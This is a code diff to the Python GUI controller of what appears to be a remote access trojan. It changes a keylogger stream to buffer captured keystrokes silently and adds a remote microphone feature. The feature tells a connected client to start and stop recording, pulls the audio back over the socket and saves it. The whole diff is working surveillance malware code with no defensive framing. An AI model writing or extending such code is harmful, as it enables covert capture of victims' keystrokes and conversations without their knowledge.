@@ -343,9 +343,8 @@ _keylog_buffer = []
 
 def start_keylog_stream():
     """
-    Send KEYLOG_START to client, then loop reading [KEYSTROKE] lines
-    and displaying them in the GUI terminal in real time.
-    Runs in a daemon thread.
+    Send KEYLOG_START to client, silently buffer keystrokes in background.
+    Buffered data is offered for save via dialog when stream stops.
     """
     global _keylog_stream_active, _keylog_buffer
     _keylog_stream_active = True
@@ -454,3 +453,85 @@ def _prompt_save_keylog(keys):
             g.terminal_output.insert(tk.END, f"✓ Keylog saved: {fn} ({len(keys)} keys)\n", "success")
         except Exception as e:
             g.terminal_output.insert(tk.END, f"❌ Save failed: {e}\n", "error")
+
+
+# ── Microphone Live-Stream ─────────────────────────────────────────────────────
+
+_mic_stream_active = False
+
+def start_mic_stream():
+    """Send MIC_START to client — recording starts immediately."""
+    global _mic_stream_active
+    _mic_stream_active = True
+    try:
+        with g.clients_lock:
+            if not g.active_client_id or g.active_client_id not in g.clients:
+                return
+            conn = g.clients[g.active_client_id]["conn"]
+        conn.send(b"MIC_START")
+    except Exception:
+        pass
+
+
+def stop_mic():
+    """Send MIC_STOP, then receive audio and prompt save dialog."""
+    global _mic_stream_active
+    _mic_stream_active = False
+    try:
+        with g.clients_lock:
+            if not g.active_client_id or g.active_client_id not in g.clients:
+                _cleanup_mic()
+                return
+            conn = g.clients[g.active_client_id]["conn"]
+
+        conn.send(b"MIC_STOP")
+
+        # Receive audio JSON response
+        all_data = b""
+        conn.settimeout(30.0)
+        while True:
+            try:
+                chunk = conn.recv(8192)
+                if not chunk:
+                    break
+                all_data += chunk
+                if b"}" in chunk:
+                    break
+            except socket.timeout:
+                break
+
+        if all_data:
+            import gui_features as feat
+            output = all_data.decode(errors="replace")
+            try:
+                import json as _json
+                response = _json.loads(output)
+                if response.get("status") == "success":
+                    dur = response.get("duration", 0)
+                    sr = response.get("sample_rate", 44100)
+                    g.root.after(0, lambda: feat.save_audio_file(response.get("data", ""), dur, sr))
+                    g.root.after(0, lambda d=dur: g.terminal_output.insert(tk.END, f"✓ Audio recorded ({d}s)\n", "success"))
+                else:
+                    g.root.after(0, lambda m=response.get('message'): g.terminal_output.insert(tk.END, f"❌ Mic failed: {m}\n", "error"))
+            except Exception:
+                if output.strip():
+                    g.root.after(0, lambda t=output: g.terminal_output.insert(tk.END, t + "\n", "output"))
+
+    except Exception as e:
+        g.root.after(0, lambda m=str(e): g.terminal_output.insert(tk.END, f"❌ Mic stream error: {m}\n", "error"))
+    finally:
+        _cleanup_mic()
+
+
+def _cleanup_mic():
+    """Restore mic button and prompt after stream ends."""
+    global _mic_stream_active
+    _mic_stream_active = False
+    if g.mic_active:
+        g.mic_active = False
+        btn = g.mic_button
+        if btn:
+            g.root.after(0, lambda: btn.config(text="🎤 Microphone", bg="#00ACC1"))
+        g.root.after(0, lambda: g.terminal_output.insert(tk.END, "🎤 Microphone stream ended\n", "success"))
+        g.root.after(0, lambda: g.terminal_output.insert(tk.END, "Remote-Admin> ", "prompt"))
+        g.root.after(0, lambda: g.terminal_output.mark_set("input_start", "end-1c"))
